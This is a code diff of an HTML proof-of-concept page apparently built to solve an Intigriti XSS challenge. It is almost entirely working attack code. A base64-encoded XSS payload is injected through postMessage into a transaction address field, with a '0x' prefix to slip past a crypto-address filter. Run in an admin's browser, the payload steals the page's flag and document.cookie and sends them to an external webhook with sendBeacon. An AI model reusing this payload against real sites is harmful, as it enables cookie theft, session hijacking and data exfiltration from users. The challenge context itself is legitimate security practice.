@@ -4,11 +4,16 @@
     <meta charset="UTF-8">
     <title>Exploit POC</title>
 </head>
-<body>
-    <button onclick="execute()" style="padding: 20px; font-size: 20px;">Launch Exploit</button>
-    <div id="log"></div>
+<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
+
+    <h1>Exploit Ready (Multi-Currency)</h1>
+    <button onclick="execute()" style="padding: 20px 40px; font-size: 20px; cursor: pointer; background: #e74c3c; color: white; border: none; border-radius: 5px;">
+        LAUNCH ATTACK 🚀
+    </button>
+    <div id="log" style="margin-top: 20px; font-family: monospace;"></div>
 
     <script>
+        // --- CONFIG ---
         const TARGET_BASE = "https://challenge-0126.intigriti.io";
         const CHECKOUT_URL = TARGET_BASE + "/checkout.html";
         const MARKETWATCH_URL = TARGET_BASE + "/marketwatch.html";
@@ -16,53 +21,88 @@
 
         function log(msg) {
             document.getElementById("log").innerText = msg;
+            console.log(msg);
         }
 
+        // --- THE MALICIOUS PAYLOAD (Runs on Admin's browser) ---
+        // 1. Send a 'PING' immediately so we know XSS fired.
+        // 2. Fetch checkout.html to get the flag.
+        // 3. Send the data using navigator.sendBeacon (reliable).
         const exfilScript = `
+            var hook = "${WEBHOOK_URL}";
+            
+            // Step 1: Immediate Ping
+            new Image().src = hook + "?type=ping_xss_fired";
+
+            // Step 2: Steal Data
             fetch('/checkout.html')
             .then(r => r.text())
             .then(html => {
-                var parser = new DOMParser();
-                var doc = parser.parseFromString(html, 'text/html');
-                var flag = doc.getElementById('flagText') ? doc.getElementById('flagText').innerText : 'NOT_FOUND';
+                // Extract flag content safely
+                var flag = "NOT_FOUND";
+                if(html.indexOf("FLAG:") > -1) {
+                    var start = html.indexOf("FLAG:");
+                    flag = html.substring(start, start + 50); // Grab 50 chars around FLAG:
+                }
+                
                 var cookies = document.cookie;
-                window.location.href = "${WEBHOOK_URL}?flag=" + btoa(flag) + "&cookie=" + btoa(cookies);
+                var payload = new FormData();
+                payload.append('flag', flag);
+                payload.append('cookie', cookies);
+                
+                // Use sendBeacon for reliability
+                navigator.sendBeacon(hook + "?type=data", payload);
             })
-            .catch(e => window.location.href = "${WEBHOOK_URL}?error=" + btoa(e));
+            .catch(e => {
+                navigator.sendBeacon(hook + "?type=error&msg=" + btoa(e.toString()));
+            });
         `;
 
         const base64Exfil = btoa(exfilScript);
-        const xssPayload = `"><img src=x onerror=eval(atob('${base64Exfil}'))>`;
+        
+        // We add "0x" to bypass potential "is this a crypto address?" regex filters
+        // Then we close the title attribute and inject the payload.
+        const xssPayload = `0x"><img src=x onerror=eval(atob('${base64Exfil}'))>`;
 
+        // --- EXECUTION ---
         function execute() {
-            log("Opening target...");
+            log("Opening target window...");
             let win = window.open(CHECKOUT_URL, "targetWindow");
 
+            // Wait 3.5s for page load
             setTimeout(() => {
-                log("Sending payload...");
+                log("Spamming payloads (BTC, XMR, 1337COIN)...");
 
-                const postMessageData = {
-                    type: "submitTransaction",
-                    transaction: {
-                        currency: "1337COIN",
-                        amount: 1337,
-                        toAddress: xssPayload
-                    }
-                };
-
+                // List of likely currencies the Admin might have
+                const currencies = ["1337COIN", "BTC", "ETH", "XMR"];
+                
                 let attempts = 0;
                 let interval = setInterval(() => {
-                    win.postMessage(postMessageData, "*");
                     attempts++;
+                    
+                    // Cycle through currencies to ensure we hit one the admin owns
+                    let curr = currencies[attempts % currencies.length];
 
-                    if (attempts > 15) {
+                    win.postMessage({
+                        type: "submitTransaction",
+                        transaction: {
+                            currency: curr,
+                            amount: 0.0001, // Small amount
+                            toAddress: xssPayload
+                        }
+                    }, "*");
+
+                    if (attempts % 5 === 0) log(`Sent ${attempts} payloads...`);
+
+                    // Stop after 20 attempts (10 seconds)
+                    if (attempts > 20) {
                         clearInterval(interval);
-                        log("Redirecting...");
+                        log("Triggering XSS (Redirecting)...");
                         win.location.href = MARKETWATCH_URL;
                     }
                 }, 500);
 
-            }, 3000);
+            }, 3500);
         }
     </script>
 </body>
